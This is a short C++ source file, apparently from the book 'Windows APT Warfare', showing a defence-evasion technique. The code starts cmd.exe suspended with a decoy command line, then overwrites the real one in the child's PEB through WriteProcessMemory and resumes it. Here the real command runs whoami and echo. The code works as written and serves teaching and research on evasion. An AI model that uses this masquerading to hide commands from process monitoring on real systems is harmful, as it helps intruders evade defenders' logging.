/**
 * masqueradeCmdline.cpp
 *
 * basic idea from:
 * www.ired.team/offensive-security/defense-evasion/masquerading-processes-in-userland-through-_peb
 *
 * Windows APT Warfare
 * by aaaddress1@chroot.org
 */
#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#pragma warning (disable : 4996)

int main(void) {
	PROCESS_INFORMATION PI = {}; STARTUPINFOA SI = {}; CONTEXT CTX = { CONTEXT_FULL };
	RTL_USER_PROCESS_PARAMETERS parentParamIn;	// 包含 child 被生成當下的參數資訊
	PEB remotePeb;

	char dummyCmdline[MAX_PATH]; /* AAA... 260 bytes */
	// 生成用不到的參數，由 260 bytes 大量 'A' 字串組成，以挪出足夠的字串記憶體空間
	memset(dummyCmdline, 'A', sizeof(dummyCmdline));

	wchar_t new_szCmdline[] = L"/c whoami & echo P1ay Win32 L!k3 a K!ng. & sleep 100";
	// 將 Windows 自帶的 32bitcmd.exe 建立為 Thread (SUSPENDED)，並傳入垃圾參數
	CreateProcessA("C:/Windows/SysWOW64/cmd.exe", dummyCmdline, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &SI, &PI);
	// 用 GetThreadContext 取得當下暫停住 Theard 之暫存器內容
	GetThreadContext(PI.hThread, &CTX);

	// 將 child Process 的 PEB 內容取出
	ReadProcessMemory(PI.hProcess, LPVOID(CTX.Ebx), &remotePeb, sizeof(remotePeb), 0);

	// 在 PEB 中 ProcessParameters 欄位取得當前 child process 的 RTL_USER_PROCESS_PARAMETERS 結構的位址
	auto paramStructAt = LPVOID(remotePeb.ProcessParameters);
	// 以 ReadProcessMemory 將 RTL_USER_PROCESS_PARAMETERS 結構的內容讀取回來
	ReadProcessMemory(PI.hProcess, paramStructAt, &parentParamIn, sizeof(parentParamIn), 0);

	// change current cmdline of the child process.
	// 以 WriteProcessMemory 將想執行的文字參數覆寫上去
	WriteProcessMemory(PI.hProcess, parentParamIn.CommandLine.Buffer, new_szCmdline, sizeof(new_szCmdline), 0);

	// 恢復 Thread 運作
	ResumeThread(PI.hThread);
	return 0;
}
